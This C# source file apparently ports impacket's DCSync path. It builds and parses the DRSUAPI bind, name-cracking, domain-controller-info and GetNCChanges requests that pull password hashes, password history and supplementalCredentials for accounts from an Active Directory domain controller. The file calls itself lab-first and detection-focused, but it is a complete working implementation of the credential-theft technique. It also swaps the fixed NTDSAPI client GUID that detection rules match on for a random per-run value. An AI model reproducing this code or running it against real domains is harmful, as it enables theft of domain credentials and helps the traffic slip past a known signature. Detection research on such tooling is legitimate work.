using System.Buffers.Binary;
using System.Text;
using DotNetPacket.Core;

namespace DotNetPacket.Protocols.Dcerpc;

/// <summary>A resolved replicated attribute: its ATTRTYP id and its raw (still-encrypted) values.</summary>
public sealed record DrsAttribute(uint AttrTyp, IReadOnlyList<byte[]> Values);

/// <summary>One replicated object from a DRSGetNCChanges reply: its DN/GUID and attribute block.</summary>
public sealed record DrsReplicaObject(string DistinguishedName, IReadOnlyList<DrsAttribute> Attributes)
{
    /// <summary>Returns the first value of <paramref name="attrTyp"/>, or null if absent/empty.</summary>
    public byte[]? FirstValue(uint attrTyp)
    {
        foreach (DrsAttribute a in Attributes)
        {
            if (a.AttrTyp == attrTyp && a.Values.Count > 0)
            {
                return a.Values[0];
            }
        }

        return null;
    }
}

/// <summary>
/// The directory replication service (MS-DRSR DRSUAPI), ported from impacket's
/// <c>dcerpc.v5.drsuapi</c> and the DCSync path of <c>examples/secretsdump.py</c>. Builds the
/// request stubs for IDL_DRSBind (opnum 0), IDL_DRSGetNCChanges (opnum 3), IDL_DRSCrackNames
/// (opnum 12) and IDL_DRSDomainControllerInfo (opnum 16), and parses their replies — enough to
/// replicate a single object's secrets (the classic DCSync). It is driven over the existing
/// sealed ncacn_ip_tcp path (<see cref="DcerpcPipe"/>), exactly as a real replication client.
/// </summary>
/// <remarks>
/// Lab-first and detection-focused: DCSync's wire signature — a DRSGetNCChanges with
/// ulExtendedOp = EXOP_REPL_OBJ issued from a host that is not a domain controller — is a
/// high-value behavioral detection, and this port exists to let the SOC generate and study it.
/// Referent ids and NDR alignment padding are emitted the way a modern Windows client would
/// (sequential referents, zero padding), which diverges harmlessly from impacket's heap-derived
/// ids and 0xAB/0xEE filler (see docs/WIRE_DIFF.md); the protocol bytes the DC acts on match.
/// </remarks>
public static class Drsuapi
{
    public const ushort OpnumDrsBind = 0;
    public const ushort OpnumDrsUnbind = 1;
    public const ushort OpnumDrsGetNcChanges = 3;
    public const ushort OpnumDrsCrackNames = 12;
    public const ushort OpnumDrsDomainControllerInfo = 16;

    /// <summary>
    /// The <c>puuidClientDsa</c> GUID sent in IDL_DRSBind. Deliberately divergent from impacket (see
    /// docs/WIRE_DIFF.md): impacket's secretsdump, mimikatz and ntdsapi.dll all send the fixed NTDSAPI
    /// client GUID <c>e24d201a-4fd6-11d1-a3da-0000f875ae0d</c>, so a rule keying on that literal flags
    /// every DCSync regardless of runtime. A real *replicating DC* sends its own unique DSA objectGUID,
    /// not a shared constant — so DotNetPacket generates a fresh per-run GUID, which looks like a real
    /// replication partner rather than the tool constant. The field is informational for the bind (the
    /// returned DRS_HANDLE is what GetNCChanges uses), and the behavioral DCSync tell (EXOP_REPL_OBJ from
    /// a non-DC source) is unchanged. Not evasion: one protocol-valid field value, no obfuscation.
    /// </summary>
    public static readonly Guid ClientDsaGuid = Guid.NewGuid();

    /// <summary>The fixed NTDSAPI client GUID impacket/mimikatz/ntdsapi send; kept for reference/tests.</summary>
    public static readonly Guid NtdsApiClientGuid = new("e24d201a-4fd6-11d1-a3da-0000f875ae0d");

    // DRS_EXTENSIONS_INT dwFlags capability bits (MS-DRSR 5.39).
    private const uint DrsExtGetChgReqV6 = 0x00400000;
    private const uint DrsExtNonDomainNcs = 0x00800000;
    private const uint DrsExtGetChgReqV8 = 0x01000000;
    private const uint DrsExtGetChgReplyV6 = 0x04000000;
    private const uint DrsExtStrongEncryption = 0x00008000;

    // DRSGetNCChanges flags (MS-DRSR 5.14 ulFlags) and extended op.
    private const uint DrsWritRep = 0x00000010;
    private const uint DrsInitSync = 0x00000020;
    public const uint ExopReplObj = 0x00000006;

    // DS_NAME_FORMAT (MS-DRSR 4.1.4.1.3).
    public const uint DsNt4AccountName = 2;
    public const uint DsUniqueIdName = 6;
    public const uint DsFqdn1779Name = 1;

    /// <summary>
    /// Canonical reply-side ATTRTYP ids for the secret/identity attributes (impacket
    /// <c>secretsdump.NAME_TO_ATTRTYP</c>). The DC answers with these fixed ids because the common
    /// prefix 1.2.840.113556.1.4 sits at a fixed index in its schema prefix table.
    /// </summary>
    public const uint AttUnicodePwd = 0x9005A;
    public const uint AttDbcsPwd = 0x90037;
    public const uint AttNtPwdHistory = 0x9005E;
    public const uint AttLmPwdHistory = 0x900A0;
    public const uint AttSupplementalCredentials = 0x9007D;
    public const uint AttObjectSid = 0x90092;
    public const uint AttSamAccountName = 0x900DD;
    public const uint AttUserPrincipalName = 0x90290;
    public const uint AttUserAccountControl = 0x90008;
    public const uint AttPwdLastSet = 0x90060;

    /// <summary>The attribute OIDs requested for a full DCSync of one account (impacket's set).</summary>
    public static readonly IReadOnlyList<string> SecretAttributeOids = new[]
    {
        "1.2.840.113556.1.4.90",  // unicodePwd
        "1.2.840.113556.1.4.94",  // ntPwdHistory
        "1.2.840.113556.1.4.160", // lmPwdHistory
        "1.2.840.113556.1.4.55",  // dBCSPwd
        "1.2.840.113556.1.4.125", // supplementalCredentials
        "1.2.840.113556.1.4.146", // objectSid
        "1.2.840.113556.1.4.221", // sAMAccountName
        "1.2.840.113556.1.4.656", // userPrincipalName
        "1.2.840.113556.1.4.8",   // userAccountControl
        "1.2.840.113556.1.4.96",  // pwdLastSet
    };

    // ---------------------------------------------------------------- DRSBind (opnum 0)

    /// <summary>Builds the DRS_EXTENSIONS_INT capability blob sent inside DRSBind (52 bytes).</summary>
    public static byte[] BuildExtensionsBlob(uint replEpoch = 0)
    {
        var w = new ByteWriter(ByteOrder.Little);
        w.WriteUInt32(DrsExtGetChgReqV6 | DrsExtGetChgReplyV6 | DrsExtGetChgReqV8 |
                      DrsExtStrongEncryption | DrsExtNonDomainNcs); // dwFlags
        w.WriteBytes(new byte[16]); // SiteObjGuid (NULLGUID)
        w.WriteUInt32((uint)Environment.ProcessId); // Pid — our real process id; impacket hardcodes 0
                                                    // (no real process has PID 0 → documented divergence)
        w.WriteUInt32(replEpoch);   // dwReplEpoch
        w.WriteUInt32(0);           // dwFlagsExt
        w.WriteBytes(new byte[16]); // ConfigObjGUID (NULLGUID)
        w.WriteUInt32(0xFFFFFFFF);  // dwExtCaps ("uber potential")
        return w.ToArray();
    }

    /// <summary>Builds the DRSBind request stub: puuidClientDsa + pextClient(DRS_EXTENSIONS).</summary>
    public static byte[] BuildBindStub(uint replEpoch = 0)
    {
        byte[] blob = BuildExtensionsBlob(replEpoch);
        var ndr = new NdrWriter();
        ndr.WriteReferent(true);                  // puuidClientDsa pointer
        ndr.WriteBytes(ClientDsaGuid.ToByteArray()); // per-run DSA GUID, not impacket's fixed NTDSAPI constant
        ndr.WriteReferent(true);                  // pextClient pointer
        ndr.WriteUInt32((uint)blob.Length);       // DRS_EXTENSIONS conformant max_count (rgb)
        ndr.WriteUInt32((uint)blob.Length);       // cb
        ndr.WriteBytes(blob);                     // rgb
        return ndr.ToArray();
    }

    /// <summary>The result of a DRSBind: the 20-byte DRS_HANDLE and the DC's replication epoch.</summary>
    public sealed record BindResult(byte[] Handle, uint ReplEpoch);

    /// <summary>Parses the DRSBind response: ppextServer(DRS_EXTENSIONS) + phDrs(DRS_HANDLE) + ErrorCode.</summary>
    public static BindResult ParseBindResponse(byte[] stub)
    {
        var r = new NdrReader(stub);
        uint serverExtRef = r.ReadReferent();
        uint replEpoch = 0;
        if (serverExtRef != 0)
        {
            r.ReadUInt32();              // conformant max_count of rgb
            uint cb = r.ReadUInt32();    // cb
            byte[] rgb = r.ReadBytes((int)cb);
            r.Align(4);
            // DRS_EXTENSIONS_INT: dwFlags(4) SiteObjGuid(16) Pid(4) dwReplEpoch(4) ...
            if (rgb.Length >= 28)
            {
                replEpoch = BinaryPrimitives.ReadUInt32LittleEndian(rgb.AsSpan(24));
            }
        }

        byte[] handle = r.ReadBytes(20); // phDrs (DRS_HANDLE, inline 20s)
        return new BindResult(handle, replEpoch);
    }

    // -------------------------------------------- DRSDomainControllerInfo (opnum 16)

    /// <summary>Builds the DRSDomainControllerInfo request stub (V1, infoLevel) for a domain.</summary>
    public static byte[] BuildDomainControllerInfoStub(byte[] hDrs, string domain, uint infoLevel = 2)
    {
        var ndr = new NdrWriter();
        ndr.WriteContextHandle(hDrs); // hDrs (inline 20s)
        ndr.WriteUInt32(1);           // dwInVersion
        ndr.WriteUInt32(1);           // pmsgIn tag = 1 (V1)
        ndr.WriteReferent(true);      // Domain pointer (LPWSTR)
        ndr.WriteUInt32(infoLevel);   // InfoLevel
        WriteConformantVaryingWStr(ndr, domain); // deferred Domain string
        return ndr.ToArray();
    }

    /// <summary>Parses DRSDomainControllerInfo V2 reply and returns the DC's NtdsDsaObjectGuid.</summary>
    public static Guid ParseDomainControllerInfoNtdsDsaGuid(byte[] stub)
    {
        var r = new NdrReader(stub);
        r.ReadUInt32();                 // pdwOutVersion
        uint tag = r.ReadUInt32();      // pmsgOut tag (expect 2)
        uint cItems = r.ReadUInt32();   // cItems
        uint rItemsRef = r.ReadReferent();
        if (cItems == 0 || rItemsRef == 0)
        {
            throw new InvalidDataException("DRSDomainControllerInfo returned no items.");
        }

        r.ReadUInt32(); // array conformant max_count
        // DS_DOMAIN_CONTROLLER_INFO_2W[0]: 7 LPWSTR pointers, 3 BOOLs, then 4 GUIDs.
        var strPresent = new uint[7];
        for (int i = 0; i < 7; i++)
        {
            strPresent[i] = r.ReadReferent();
        }

        r.ReadUInt32(); // fIsPdc
        r.ReadUInt32(); // fDsEnabled
        r.ReadUInt32(); // fIsGc
        r.ReadBytes(16); // SiteObjectGuid
        r.ReadBytes(16); // ComputerObjectGuid
        r.ReadBytes(16); // ServerObjectGuid
        byte[] ntdsGuid = r.ReadBytes(16); // NtdsDsaObjectGuid
        return new Guid(ntdsGuid);
    }

    // ---------------------------------------------------- DRSCrackNames (opnum 12)

    /// <summary>Builds the DRSCrackNames request stub (V1) for a single name lookup.</summary>
    public static byte[] BuildCrackNamesStub(byte[] hDrs, uint formatOffered, uint formatDesired, string name)
    {
        var ndr = new NdrWriter();
        ndr.WriteContextHandle(hDrs); // hDrs
        ndr.WriteUInt32(1);           // dwInVersion
        ndr.WriteUInt32(1);           // tag = 1 (V1)
        ndr.WriteUInt32(0);           // CodePage
        ndr.WriteUInt32(0);           // LocaleId
        ndr.WriteUInt32(0);           // dwFlags
        ndr.WriteUInt32(formatOffered);
        ndr.WriteUInt32(formatDesired);
        ndr.WriteUInt32(1);           // cNames
        ndr.WriteReferent(true);      // rpNames pointer (array)
        ndr.WriteUInt32(1);           // array conformant max_count
        ndr.WriteReferent(true);      // rpNames[0] LPWSTR pointer
        WriteConformantVaryingWStr(ndr, name); // deferred string
        return ndr.ToArray();
    }

    /// <summary>A cracked name: resolution status and the resolved name (e.g. the objectGUID string).</summary>
    public sealed record CrackedName(uint Status, string? Domain, string? Name);

    /// <summary>Parses the DRSCrackNames reply and returns the first DS_NAME_RESULT_ITEMW.</summary>
    public static CrackedName ParseCrackNamesResponse(byte[] stub)
    {
        var r = new NdrReader(stub);
        r.ReadUInt32();                  // pdwOutVersion
        r.ReadUInt32();                  // tag (V1)
        uint resultRef = r.ReadReferent(); // pResult pointer (DS_NAME_RESULTW)
        if (resultRef == 0)
        {
            throw new InvalidDataException("DRSCrackNames: null pResult.");
        }

        uint cItems = r.ReadUInt32();
        uint itemsRef = r.ReadReferent();
        if (cItems == 0 || itemsRef == 0)
        {
            throw new InvalidDataException("DRSCrackNames: no items.");
        }

        r.ReadUInt32(); // array conformant max_count
        // DS_NAME_RESULT_ITEMW[0]: status(4) + pDomain(ptr) + pName(ptr), then deferred strings.
        uint status = r.ReadUInt32();
        uint domainRef = r.ReadReferent();
        uint nameRef = r.ReadReferent();
        string? domain = domainRef != 0 ? ReadConformantVaryingWStr(r) : null;
        string? name = nameRef != 0 ? ReadConformantVaryingWStr(r) : null;
        return new CrackedName(status, domain, name);
    }

    // -------------------------------------------------- DRSGetNCChanges (opnum 3)

    /// <summary>
    /// Builds the DRSGetNCChanges request stub (V8, EXOP_REPL_OBJ) replicating a single object
    /// identified by <paramref name="targetObjectGuid"/>, requesting the DCSync attribute set.
    /// </summary>
    /// <summary>
    /// The DCSync attribute set as canonical reply-side ATTRTYP ids (prefix index 9, the schema's
    /// built-in MS prefix). These are sent with an empty request prefix table so the DC resolves
    /// them through its own base schema prefix map — the interoperable path a DC always accepts.
    /// </summary>
    public static readonly uint[] SecretAttids =
    {
        AttUnicodePwd, AttNtPwdHistory, AttLmPwdHistory, AttDbcsPwd, AttSupplementalCredentials,
        AttObjectSid, AttSamAccountName, AttUserPrincipalName, AttUserAccountControl, AttPwdLastSet,
    };

    /// <summary>
    /// Builds a DRSGetNCChanges request (V8, EXOP_REPL_OBJ) replicating a single object identified by
    /// its <paramref name="packedSid"/> (a 28-byte NT4SID) instead of its objectGUID — the SID path
    /// (impacket's DRSGetNCChangesSid) skips the per-account DRSCrackNames round-trip for a bulk dump.
    /// </summary>
    public static byte[] BuildGetNCChangesStubBySid(byte[] hDrs, Guid ntdsDsaGuid, byte[] packedSid) =>
        BuildGetNCChangesStubCore(hDrs, ntdsDsaGuid, ndr => WriteDsNameSid(ndr, packedSid));

    public static byte[] BuildGetNCChangesStub(byte[] hDrs, Guid ntdsDsaGuid, Guid targetObjectGuid) =>
        BuildGetNCChangesStubCore(hDrs, ntdsDsaGuid, ndr => WriteDsName(ndr, targetObjectGuid));

    private static byte[] BuildGetNCChangesStubCore(byte[] hDrs, Guid ntdsDsaGuid, Action<NdrWriter> writeNc)
    {
        uint[] attids = SecretAttids;
        var ndr = new NdrWriter();
        ndr.WriteContextHandle(hDrs);    // hDrs
        ndr.WriteUInt32(8);              // dwInVersion
        ndr.WriteUInt32(8);              // pmsgIn tag = 8 (V8)
        ndr.Align(8);                    // V8 struct is 8-aligned (contains hyper fields)
        ndr.WriteBytes(ntdsDsaGuid.ToByteArray()); // uuidDsaObjDest
        ndr.WriteBytes(ntdsDsaGuid.ToByteArray()); // uuidInvocIdSrc
        ndr.WriteReferent(true);         // pNC pointer
        ndr.Align(8);
        ndr.WriteBytes(new byte[24]);    // usnvecFrom (3x hyper = 0)
        ndr.WriteReferent(false);        // pUpToDateVecDest = NULL
        ndr.WriteUInt32(DrsInitSync | DrsWritRep); // ulFlags
        ndr.WriteUInt32(1);              // cMaxObjects
        ndr.WriteUInt32(0);              // cMaxBytes
        ndr.WriteUInt32(ExopReplObj);    // ulExtendedOp
        ndr.Align(8);
        ndr.WriteBytes(new byte[8]);     // liFsmoInfo (hyper = 0)
        ndr.WriteReferent(true);         // pPartialAttrSet pointer
        ndr.WriteReferent(false);        // pPartialAttrSetEx1 = NULL
        ndr.WriteUInt32(0);              // PrefixTableDest.PrefixCount (empty: use the DC's base map)
        ndr.WriteReferent(false);        // PrefixTableDest.pPrefixEntry = NULL

        // Deferred pointees, in field order.
        writeNc(ndr);                         // pNC -> DSNAME (by GUID or by SID)
        WritePartialAttrSet(ndr, attids);     // pPartialAttrSet -> PARTIAL_ATTR_VECTOR_V1_EXT
        return ndr.ToArray();
    }

    /// <summary>
    /// Parses a DRSGetNCChanges V6 reply far enough to return the replicated object's attribute
    /// block (attrTyp + raw, still-encrypted values). Follows the NDR deferred-pointer order of
    /// DRS_MSG_GETCHGREPLY_V6 down to pObjects.Entinf.AttrBlock.
    /// </summary>
    public static DrsReplicaObject ParseGetNCChangesReply(byte[] stub)
    {
        var r = new NdrReader(stub);
        r.ReadUInt32();                 // pdwOutVersion
        uint tag = r.ReadUInt32();      // pmsgOut tag (reply version)
        r.Align(8);                     // V6 struct is 8-aligned (hyper fields)
        r.ReadBytes(16);                // uuidDsaObjSrc
        r.ReadBytes(16);                // uuidInvocIdSrc
        uint pNcRef = r.ReadReferent(); // pNC pointer
        r.Align(8);
        r.ReadBytes(24);                // usnvecFrom
        r.ReadBytes(24);                // usnvecTo
        uint upToDateRef = r.ReadReferent(); // pUpToDateVecSrc pointer
        uint prefixCount = r.ReadUInt32();   // PrefixTableSrc.PrefixCount
        uint prefixRef = r.ReadReferent();   // PrefixTableSrc.pPrefixEntry pointer
        r.ReadUInt32();                 // ulExtendedRet (EXOP_ERR)
        uint cNumObjects = r.ReadUInt32();
        r.ReadUInt32();                 // cNumBytes
        uint pObjectsRef = r.ReadReferent(); // pObjects (PREPLENTINFLIST)
        r.ReadUInt32();                 // fMoreData
        r.ReadUInt32();                 // cNumNcSizeObjectsc
        r.ReadUInt32();                 // cNumNcSizeValues
        r.ReadUInt32();                 // cNumValues
        r.ReadUInt32();                 // rgValues (NULL here; impacket treats as DWORD)
        r.ReadUInt32();                 // dwDRSError
        // NDRCALL ErrorCode trails ALL the deferred data, so it is not read here.

        // Deferred: pNC(DSNAME), pUpToDateVecSrc, PrefixTableSrc entries, then pObjects.
        if (pNcRef != 0)
        {
            SkipDsName(r);
        }

        if (upToDateRef != 0)
        {
            SkipUpToDateVectorV2(r);
        }

        if (prefixRef != 0)
        {
            SkipPrefixTable(r, prefixCount);
        }

        if (pObjectsRef == 0 || cNumObjects == 0)
        {
            return new DrsReplicaObject(string.Empty, Array.Empty<DrsAttribute>());
        }

        return ParseReplEntInfList(r);
    }

    // ---- REPLENTINFLIST / ENTINF / ATTRBLOCK parse ----

    private static DrsReplicaObject ParseReplEntInfList(NdrReader r)
    {
        // REPLENTINFLIST (MS-DRSR 5.161):
        //   pNextEntInf(ptr) + Entinf{pName(ptr), ulFlags, AttrBlock{attrCount, pAttr(ptr)}}
        //   + fIsNCPrefix(BOOL) + pParentGuidm(ptr) + pMetaDataExt(ptr)
        // For EXOP_REPL_OBJ a single object is returned and pNextEntInf is NULL.
        r.ReadReferent();                 // pNextEntInf (NULL for a single-object reply)
        uint pNameRef = r.ReadReferent(); // Entinf.pName
        r.ReadUInt32();                   // Entinf.ulFlags
        uint attrCount = r.ReadUInt32();  // AttrBlock.attrCount
        uint pAttrRef = r.ReadReferent(); // AttrBlock.pAttr pointer
        r.ReadUInt32();                   // fIsNCPrefix (BOOL)
        r.ReadReferent();                 // pParentGuidm
        r.ReadReferent();                 // pMetaDataExt

        // Deferred for this entry: pName DSNAME, then the AttrBlock pAttr array.
        string dn = string.Empty;
        if (pNameRef != 0)
        {
            dn = ReadDsNameString(r);
        }

        var attrs = new List<DrsAttribute>();
        if (pAttrRef != 0)
        {
            r.ReadUInt32(); // ATTR array conformant max_count
            // Each ATTR: attrTyp(4) + AttrVal(valCount(4) + pAVal ptr). Pointers deferred after the array.
            var valCounts = new uint[attrCount];
            var valRefs = new uint[attrCount];
            var typs = new uint[attrCount];
            for (int i = 0; i < attrCount; i++)
            {
                typs[i] = r.ReadUInt32();
                valCounts[i] = r.ReadUInt32();
                valRefs[i] = r.ReadReferent();
            }

            for (int i = 0; i < attrCount; i++)
            {
                var values = new List<byte[]>();
                if (valRefs[i] != 0)
                {
                    r.ReadUInt32(); // ATTRVAL array conformant max_count
                    var lens = new uint[valCounts[i]];
                    var pvalRefs = new uint[valCounts[i]];
                    for (int v = 0; v < valCounts[i]; v++)
                    {
                        lens[v] = r.ReadUInt32();     // valLen
                        pvalRefs[v] = r.ReadReferent(); // pVal pointer
                    }

                    for (int v = 0; v < valCounts[i]; v++)
                    {
                        if (pvalRefs[v] != 0)
                        {
                            r.ReadUInt32(); // BYTE_ARRAY conformant max_count
                            values.Add(r.ReadBytes((int)lens[v]));
                            r.Align(4);
                        }
                    }
                }

                attrs.Add(new DrsAttribute(typs[i], values));
            }
        }

        return new DrsReplicaObject(dn, attrs);
    }

    // ---- helpers: DSNAME, partial attr set, prefix table, strings ----

    private static void WriteDsName(NdrWriter ndr, Guid objectGuid)
    {
        // DSNAME for a GUID-only target: StringName max_count=1 (just the NUL), NameLen=0.
        ndr.WriteUInt32(1);                 // StringName conformant max_count (1 wchar)
        ndr.WriteUInt32(62);                // structLen (matches impacket for this shape)
        ndr.WriteUInt32(0);                 // SidLen
        ndr.WriteBytes(objectGuid.ToByteArray()); // Guid (16)
        ndr.WriteBytes(new byte[28]);       // Sid (NT4SID, empty)
        ndr.WriteUInt32(0);                 // NameLen
        ndr.WriteUInt16(0);                 // StringName[0] = NUL
        ndr.Align(4);
    }

    private static void WriteDsNameSid(NdrWriter ndr, byte[] packedSid)
    {
        // DSNAME for a SID target: SidLen = the SID's length, Guid empty, StringName just the NUL.
        var sid28 = new byte[28];
        Array.Copy(packedSid, sid28, Math.Min(packedSid.Length, 28));
        ndr.WriteUInt32(1);                 // StringName conformant max_count
        ndr.WriteUInt32(62);                // structLen (matches impacket for this shape)
        ndr.WriteUInt32((uint)packedSid.Length); // SidLen
        ndr.WriteBytes(new byte[16]);       // Guid (empty)
        ndr.WriteBytes(sid28);              // Sid (NT4SID)
        ndr.WriteUInt32(0);                 // NameLen
        ndr.WriteUInt16(0);                 // StringName[0] = NUL
        ndr.Align(4);
    }

    private static void SkipDsName(NdrReader r)
    {
        uint maxCount = r.ReadUInt32();     // StringName max_count
        r.ReadUInt32();                     // structLen
        r.ReadUInt32();                     // SidLen
        r.ReadBytes(16);                    // Guid
        r.ReadBytes(28);                    // Sid
        r.ReadUInt32();                     // NameLen
        r.ReadBytes((int)maxCount * 2);     // StringName chars
        r.Align(4);
    }

    private static string ReadDsNameString(NdrReader r)
    {
        uint maxCount = r.ReadUInt32();     // StringName max_count
        r.ReadUInt32();                     // structLen
        r.ReadUInt32();                     // SidLen
        r.ReadBytes(16);                    // Guid
        r.ReadBytes(28);                    // Sid
        r.ReadUInt32();                     // NameLen
        string s = r.ReadWideChars((int)maxCount).TrimEnd('\0');
        r.Align(4);
        return s;
    }

    private static void WritePartialAttrSet(NdrWriter ndr, uint[] attids)
    {
        ndr.WriteUInt32((uint)attids.Length); // rgPartialAttr conformant max_count
        ndr.WriteUInt32(1);                   // dwVersion
        ndr.WriteUInt32(0);                   // dwReserved1
        ndr.WriteUInt32((uint)attids.Length); // cAttrs
        foreach (uint a in attids)
        {
            ndr.WriteUInt32(a);
        }
    }

    private static void SkipUpToDateVectorV2(NdrReader r)
    {
        // UPTODATE_VECTOR_V2_EXT: dwVersion, dwReserved1, cNumCursors, dwReserved2, rgCursors[]
        uint maxCount = r.ReadUInt32(); // conformant max_count of rgCursors
        r.ReadUInt32();                 // dwVersion
        r.ReadUInt32();                 // dwReserved1
        uint cNumCursors = r.ReadUInt32();
        r.ReadUInt32();                 // dwReserved2
        for (uint i = 0; i < cNumCursors; i++)
        {
            r.ReadBytes(16);            // uuidDsa
            r.Align(8);
            r.ReadBytes(8);             // usnHighPropUpdate (hyper)
            r.ReadBytes(8);             // timeLastSyncSuccess (hyper)
        }
    }

    private static void SkipPrefixTable(NdrReader r, uint prefixCount)
    {
        if (prefixCount == 0)
        {
            return;
        }

        r.ReadUInt32(); // array conformant max_count
        var elemRefs = new uint[prefixCount];
        var lengths = new uint[prefixCount];
        for (uint i = 0; i < prefixCount; i++)
        {
            r.ReadUInt32();              // ndx
            lengths[i] = r.ReadUInt32(); // prefix.length
            elemRefs[i] = r.ReadReferent(); // prefix.elements pointer
        }

        for (uint i = 0; i < prefixCount; i++)
        {
            if (elemRefs[i] != 0)
            {
                r.ReadUInt32();                 // BYTE_ARRAY conformant max_count
                r.ReadBytes((int)lengths[i]);   // elements
                r.Align(4);
            }
        }
    }

    private static void WriteConformantVaryingWStr(NdrWriter ndr, string value)
    {
        string terminated = value.EndsWith('\0') ? value : value + "\0";
        ndr.WriteUInt32((uint)terminated.Length); // max_count
        ndr.WriteUInt32(0);                        // offset
        ndr.WriteUInt32((uint)terminated.Length);  // actual_count
        ndr.WriteBytes(Encoding.Unicode.GetBytes(terminated));
        ndr.Align(4);
    }

    private static string ReadConformantVaryingWStr(NdrReader r)
    {
        r.ReadUInt32();                   // max_count
        r.ReadUInt32();                   // offset
        uint actual = r.ReadUInt32();     // actual_count
        string s = r.ReadWideChars((int)actual).TrimEnd('\0');
        r.Align(4);
        return s;
    }
}
